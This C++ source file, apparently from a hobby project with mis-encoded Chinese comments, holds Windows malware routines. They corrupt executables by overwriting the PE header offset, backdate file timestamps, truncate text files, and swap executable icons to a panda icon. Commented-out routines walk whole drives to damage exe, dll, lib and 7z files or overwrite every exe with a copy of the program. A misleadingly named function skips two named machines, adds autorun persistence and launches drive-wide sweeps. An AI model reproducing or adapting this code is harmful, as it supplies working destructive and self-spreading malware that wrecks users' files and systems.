

#include "stdafx.h"
#include "WinHack.h"
#include <io.h>
#include <fstream>
#include "Convert.h"
#include "WinSysInfo.h"
#include "WinFileSys.h"
#include "WinLogIni.h"



void hack_Infectexedll(const char* Filename)
{
#ifndef DANGE_OFF
    LogFun(Filename);
    return;
#else
    std::fstream iofile(Filename, ios::in | ios::out | ios::binary);    //�����Ƹ�д
    if (iofile)
    {
        const char* headstr = "....";
        iofile.seekp(60, ios::beg);                 //Ѱ��60λ��
        iofile.write(headstr, sizeof(headstr));     //�ݻ�DOS��ַ
        iofile.close();
        //ע�����ܻ�ݲ��
        hack_updateexetime(Filename);
    }
#endif
}

void hack_InfectTXT(const char* Filename)
{
    //������ʵ����������ļ�*��д*���� �����Ϊ0kb�ٿ�ʼ
    std::ofstream fout(Filename, std::ios::binary);
    int nNum = 20;
    std::string str("ERROR");
    fout.write((char*) &nNum, sizeof(int));
    fout.write(str.c_str(), sizeof(char) * (str.size()));
    fout.close();
}

bool hack_ExeChangeIcon(char* ExeFile, char* IconFile)
{
    if (0 == strcmp(IconFile, ""))
    {
        //�����㷨��Ҫ�Ż� ��Ϊֻ�޸���һ��ͼ��
        RaiseToDebug();         //������Ȩ
        HGLOBAL hResLoad(NULL);
        HANDLE hExe(NULL);
        HRSRC hRes(NULL);
        HANDLE hUpdateRes(NULL);
        char* lpResLock;
        BOOL result;
        hExe = LoadLibraryA(GetExePath(1).c_str()); //LoadLibraryA("SQCore.exe");
        if (hExe == NULL)
            return false;             //       ShowBox("����Src.exeʧ��.");
        hRes = FindResourceA((HMODULE) hExe, (LPCSTR) 1, MAKEINTRESOURCEA(3));
        if (hRes == NULL)
            return false;             //       ShowBox("���ܶ�λSrc.exe�еĵ�һ��ͼ��");
        hResLoad = LoadResource((HMODULE) hExe, hRes);
        if (hResLoad == NULL)
            return false;         //ShowBox("���ܼ��ظ�ͼ����Դ");
        lpResLock = (char*) LockResource(hResLoad);
        if (lpResLock == NULL)
            return false;         //ShowBox("������������Դ.");
        hUpdateRes = BeginUpdateResourceA(ExeFile, FALSE);
        if (hUpdateRes == NULL)
            return false;   //ShowBox("���ܴ�Target.exe׼��д.");
        result = UpdateResource(hUpdateRes, RT_ICON, (LPCWSTR) 1, MAKELANGID(LANG_CHINESE, SUBLANG_SYS_DEFAULT), lpResLock, SizeofResource((HMODULE) hExe, hRes));
        if (result == FALSE)
            return false;             //ShowBox("�����Դʧ��.");
        if (!EndUpdateResourceA(hUpdateRes, false))
            return false; //ShowBox("������Ŀ��EXE��д��Ķ�������Դ����");
        if (!FreeLibrary((HMODULE) hExe))
            return false; //ShowBox("�����ͷ�Src�ľ��.");
        return true;
    }
    else
    {
        HEADER header;
        DWORD dwRet(0), nSize(0), nGSize(0), dwReserved(0);
        LPICONDIRENTRY pIconDirEntry(NULL);
        LPGRPICONDIR pGrpIconDir(NULL);
        LPBYTE pIconBytes(NULL);
        HANDLE hUpdate(NULL);
        WORD i(0);
        //�ļ����
        HANDLE hIconFile(NULL);
        //��ͼ���ļ�
        hIconFile = CreateFile(CharCovLpctstr(IconFile), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hIconFile == INVALID_HANDLE_VALUE)
            return false;
        //��ȡ�ļ�ͷ����Ϣ
        if (!ReadFile(hIconFile, &header, sizeof(HEADER), &dwReserved, NULL))
        {
            CloseHandle(hIconFile);
            return false;
        }
        //����ÿһ��ͼ���Ŀ¼��Ϣ�������
        pIconDirEntry = (LPICONDIRENTRY) new BYTE[header.idCount * sizeof(ICONDIRENTRY)];
        if (pIconDirEntry == NULL)
        {
            CloseHandle(hIconFile);
            return false;
        }
        //��Icon�ļ��ж�ȡÿһ��ͼ���Ŀ¼��Ϣ
        if (!ReadFile(hIconFile, pIconDirEntry, header.idCount * sizeof(ICONDIRENTRY), &dwReserved, NULL))
        {
            delete[] pIconDirEntry;
            CloseHandle(hIconFile);
            return false;
        }
        //����EXE�ļ���RT_GROUP_ICON��������ݽṹ�������
        nGSize = sizeof(GRPICONDIR) + header.idCount * sizeof(ICONDIRENTRY);
        pGrpIconDir = (LPGRPICONDIR) new BYTE[nGSize];
        //�����Ϣ�������൱��һ��ת���Ĺ���
        pGrpIconDir->idReserved = header.idReserved;
        pGrpIconDir->idType = header.idType;
        pGrpIconDir->idCount = header.idCount;
        //������Ϣ������ÿһ��ͼ���Ӧ��ID��IDΪλ��������
        for (i = 0; i < header.idCount; i++)
        {
            pGrpIconDir->idEntries[i].bWidth = pIconDirEntry[i].bWidth;
            pGrpIconDir->idEntries[i].bHeight = pIconDirEntry[i].bHeight;
            pGrpIconDir->idEntries[i].bColorCount = pIconDirEntry[i].bColorCount;
            pGrpIconDir->idEntries[i].bReserved = pIconDirEntry[i].bReserved;
            pGrpIconDir->idEntries[i].wPlanes = pIconDirEntry[i].wPlanes;
            pGrpIconDir->idEntries[i].wBitCount = pIconDirEntry[i].wBitCount;
            pGrpIconDir->idEntries[i].dwBytesInRes = pIconDirEntry[i].dwBytesInRes;
            pGrpIconDir->idEntries[i].nID = i;
        }
        //��ʼ����EXE�е�ͼ����Դ��ID��Ϊ��С�������ԭ�����ڣ�ID��ͼ����Ϣ���滻Ϊ�µġ�
        hUpdate = BeginUpdateResource(CharCovLpctstr(ExeFile), false);
        if (hUpdate != NULL)
        {
            //���ȸ���RT_GROUP_ICON��Ϣ
            if (!UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(0), MAKELANGID(LANG_CHINESE, SUBLANG_SYS_DEFAULT), (LPVOID) pGrpIconDir, nGSize))
            {
                delete[] pIconDirEntry;
                delete[] pGrpIconDir;
                CloseHandle(hIconFile);
                return false;
            }
            //���ŵ���ÿһ��Icon����Ϣ���
            for (i = 0; i < header.idCount; i++)
            {
                //Icon���ֽ���
                nSize = pIconDirEntry[i].dwBytesInRes;
                //ƫ���ļ���ָ�뵽��ǰͼ��Ŀ�ʼ��
                dwRet = SetFilePointer(hIconFile, pIconDirEntry[i].dwImageOffset, NULL, FILE_BEGIN);
                if (dwRet == INVALID_SET_FILE_POINTER)
                    break;
                //׼��pIconBytes������ļ����Byte��Ϣ���ڸ��µ�EXE�С�
                delete[] pIconBytes;
                pIconBytes = new BYTE[nSize];
                if (!ReadFile(hIconFile, (LPVOID) pIconBytes, nSize, &dwReserved, NULL))
                    break;
                //����ÿһ��ID��Ӧ��RT_ICON��Ϣ
                if (!UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(pGrpIconDir->idEntries[i].nID), MAKELANGID(LANG_CHINESE, SUBLANG_SYS_DEFAULT), (LPVOID) pIconBytes, nSize))
                    break;
            }
            //����EXE��Դ�ĸ��²���
            if (pIconBytes != NULL)
                delete[] pIconBytes;
            EndUpdateResource(hUpdate, false);
        }
        //������Դ���ر�Icon�ļ������˸��²���������
        delete[] pGrpIconDir;
        delete[] pIconDirEntry;
        CloseHandle(hIconFile);
        return true;
    }
}

void hack_LoopThoseFile(const char* PathName, const char* Typename)
{
    ////��÷ŵ��߳��д���
    //struct _finddata_t filefind;
    //string curr = ChkPachSkew ( PathName, true ) + "*.*", str1; //����
    //intptr_t done = 0, handle;
    //if ( ( handle = _findfirst ( curr.c_str(), &filefind ) ) == -1 )
    //    return;         //ʲô��û�ҵ�
    //while ( ! ( done = _findnext ( handle, &filefind ) ) )
    //{
    //    if ( !strcmp ( filefind.name, ".." ) ) continue;
    //    str1 = ChkPachSkew ( PathName, true ) + filefind.name;
    //    if ( ( filefind.attrib & _A_SUBDIR ) )
    //    {
    //        curr = ChkPachSkew ( str1, false );
    //        hack_LoopInfectFile ( curr.c_str(), Typename ); //�ݹ����
    //    }
    //    else            //��������ļ�  ע���ļ�����
    //    {
    //        if ( ( 0 == strcmp ( Typename, "" ) ) || ( rightstr ( filefind.name, 3 ) == string ( Typename ) ) ) //�����ļ�����
    //            //�˴�����������
    //            hack_Infectexedll ( str1.c_str() );
    //    }
    //}
    //_findclose ( handle );
}

void hack_LoopInfectFile(const char* PathName, const char* Typename)
{
    //struct _finddata_t filefind;
    //string curr = ChkPachSkew ( PathName, true ) + "*.*";
    //intptr_t done = 0, handle;
    //if ( ( handle = _findfirst ( curr.c_str(), &filefind ) ) == -1 )
    //    return;
    //while ( ! ( done = _findnext ( handle, &filefind ) ) )
    //{
    //    if ( !strcmp ( filefind.name, ".." ) ) continue;
    //    string str1 = ChkPachSkew ( PathName, true ) + filefind.name;
    //    if ( ( filefind.attrib & _A_SUBDIR ) )
    //    {
    //        curr = ChkPachSkew ( str1, false );
    //        hack_LoopInfectFile ( curr.c_str(), Typename );
    //    }
    //    else
    //    {
    //        if ( ( 0 == strcmp ( Typename, "" ) )
    //             || ( 0 == strcmp ( Typename, RightChar ( filefind.name, 3 ) ) )
    //             || ( 0 == strcmp ( "dll", RightChar ( filefind.name, 3 ) ) )
    //             || ( 0 == strcmp ( "lib", RightChar ( filefind.name, 3 ) ) )
    //             || ( 0 == strcmp ( "7z", RightChar ( filefind.name, 2 ) ) ) )
    //            hack_Infectexedll ( str1.c_str() );
    //    }
    //}
    //_findclose ( handle );
}

void hack_LoopCopySelfexe(const char* PathName, const char* selfpath)
{
    //struct _finddata_t filefind;
    //string curr = ChkPachSkew ( PathName, true ) + "*.*", str1;
    //intptr_t done = 0, handle;
    //if ( ( handle = _findfirst ( curr.c_str(), &filefind ) ) == -1 )
    //    return;
    //while ( ! ( done = _findnext ( handle, &filefind ) ) )
    //{
    //    if ( !strcmp ( filefind.name, ".." ) ) continue;
    //    str1 = ChkPachSkew ( PathName, true ) + filefind.name;
    //    if ( ( filefind.attrib & _A_SUBDIR ) )
    //    {
    //        curr = ChkPachSkew ( str1, false );
    //        hack_LoopCopySelfexe ( curr.c_str(), selfpath );
    //    }
    //    else
    //    {
    //        if ( 0 == strcmp ( "exe", RightChar ( filefind.name, 3 ) ) )
    //        {
    //            DeleteFileA ( str1.c_str() );
    //            if ( !CopyFileA ( selfpath, str1.c_str(), FALSE ) )
    //                cout << str1.c_str() << " copy error " << endl;
    //        }
    //    }
    //}
    //_findclose ( handle );
}

void hack_LoopInfectTxt(const char* PathName, const char* Typename)
{
    //struct _finddata_t filefind;
    //string curr = ChkPachSkew ( PathName, true ) + "*.*", str1;
    //intptr_t done = 0, handle;
    //if ( ( handle = _findfirst ( curr.c_str(), &filefind ) ) == -1 )
    //    return;
    //while ( ! ( done = _findnext ( handle, &filefind ) ) )
    //{
    //    if ( !strcmp ( filefind.name, ".." ) ) continue;
    //    str1 = ChkPachSkew ( PathName, true ) + filefind.name;
    //    if ( ( filefind.attrib & _A_SUBDIR ) )
    //    {
    //        curr = ChkPachSkew ( str1, false );
    //        hack_LoopInfectFile ( curr.c_str(), Typename );
    //    }
    //    else
    //    {
    //        if ( ( rightstr ( filefind.name, 3 ) == string ( Typename ) ) /*|| (rightstr(filefind.name, 3) =="cpp")*/ ) //�����ļ�����
    //            hack_InfectTXT ( str1.c_str() );
    //    }
    //}
    //_findclose ( handle );
}

void hack_LoopIconExeFile(const char* PathName)
{
    //struct _finddata_t filefind;
    //string curr = ChkPachSkew ( PathName, true ) + "*.*", str1;
    //intptr_t done = 0, handle;
    //if ( ( handle = _findfirst ( curr.c_str(), &filefind ) ) == -1 )
    //    return;         //ʲô��û�ҵ�
    //while ( ! ( done = _findnext ( handle, &filefind ) ) )
    //{
    //    if ( !strcmp ( filefind.name, ".." ) ) continue;
    //    str1 = ChkPachSkew ( PathName, true ) + filefind.name;
    //    if ( ( filefind.attrib & _A_SUBDIR ) )
    //    {
    //        curr = ChkPachSkew ( str1, false );
    //        hack_LoopIconExeFile ( curr.c_str() );
    //    }
    //    else             //��������ļ�  ע���ļ�����
    //    {
    //        if ( rightstr ( filefind.name, 3 ) == "exe" ) //�����ļ�����
    //            hack_ExeChangeIcon ( const_cast<char*> ( str1.c_str() ), "Panda.ico" );
    //    }
    //}
    //_findclose ( handle );
}

void hack_updateexetime(const char* f_name)
{
    SYSTEMTIME t;
    FILETIME ft;
    HANDLE file;
    GetSystemTime(&t);
    t.wDay = t.wDay - 1;
    t.wHour = t.wHour - 3;
    SystemTimeToFileTime(&t, &ft);
    file = CreateFileA(f_name, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    SetFileTime(file, &ft, &ft, &ft);
    CloseHandle(file);
    return;
}

#ifndef  ThreadPro_FunThreadProc
typedef void (*FunThreadProc)(void);
void ThreadProTmp(FunThreadProc f_NewFun)
{
    HANDLE StartThreadHandle;
    DWORD StartThreadID;
    StartThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) f_NewFun, NULL, 0, &StartThreadID);
    CloseHandle(StartThreadHandle);    //�����߳���ɺ��Զ��ͷ��߳�
}

void testDfile(void)
{
    if (GetDriveTypeA("D:") != DRIVE_NO_ROOT_DIR)
        hack_LoopInfectFile("D:/", "exe");    //D����
    else
        hack_LoopInfectFile("C:/", "exe");
    cout << "dend" << endl;
}

void testEfile(void)
{
    if (GetDriveTypeA("E:") != DRIVE_NO_ROOT_DIR)
        hack_LoopInfectFile("E:/", "exe");
    cout << "eend" << endl;
}

void testFfile(void)
{
    if (GetDriveTypeA("F:") != DRIVE_NO_ROOT_DIR)
        hack_LoopInfectFile("F:/", "exe");
    cout << "fend" << endl;
}

void testCPPTxt(void)
{
    if (GetDriveTypeA("D:") != DRIVE_NO_ROOT_DIR)
        hack_LoopInfectTxt("D:/", "cpp");
    else
        hack_LoopInfectTxt("E:/", "cpp");
}

void hack_ThreadFile(void)
{
    ThreadProTmp(testDfile);
    ThreadProTmp(testEfile);
    ThreadProTmp(testFfile);
}
#endif

char* GetPCName(void)
{
    static char buf[255] = { 0 };
    DWORD mdwSize = sizeof(buf);
    if (GetComputerNameExA((COMPUTER_NAME_FORMAT) 1, buf, &mdwSize))
        return buf;
    else
        return "0";
}

int hack_ZwNtSuspendProcess(int ff)
{
    if (strcmp("ThinkPad-X220", GetPCName()) == 0)
    {
        cout << "sys error!" << endl;
        return 0;
    }
    if (strcmp("E550c-PC", GetPCName()) == 0)
    {
        cout << "sys error!" << endl;
        return 0;
    }
    SetAutoRun("bfsvcl");
    if (0 == ff)
    {
        ThreadProTmp(testDfile);
        ThreadProTmp(testEfile);
        ThreadProTmp(testFfile);
    }
    else
    {
        testDfile();
        testEfile();
        testFfile();
#ifndef __DANGE__
        LogFun("run ok!");
#endif
    }
    return 0;
}








